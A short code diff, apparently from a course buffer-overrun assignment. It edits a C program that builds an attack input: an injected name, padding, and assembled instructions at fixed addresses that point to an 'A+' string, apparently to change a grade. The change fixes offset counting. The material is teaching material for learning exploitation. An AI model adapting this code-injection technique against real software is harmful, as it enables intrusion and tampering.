@@ -22,12 +22,13 @@ int main(void) {
     fwrite(pcInject, sizeof(char), iNameLength, psFile);
     /* padding */
     fprintf(psFile, "%c", '0');
+    i = iNameLength + 1;
     
     /* write instructions */
     /* put address of new string in reg 0 */
     uiAdr = MiniAssembler_adr(0, 0x420070, 0x420064);
     fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
-    i = iNameLength + 4;
+    i = i + 4;
     /* put address of new A+ string in reg 1 */
     uiAdr1 = MiniAssembler_adr(1, 0x420085, 0x420068);
     fwrite(&uiAdr1, sizeof(unsigned int), 1, psFile);
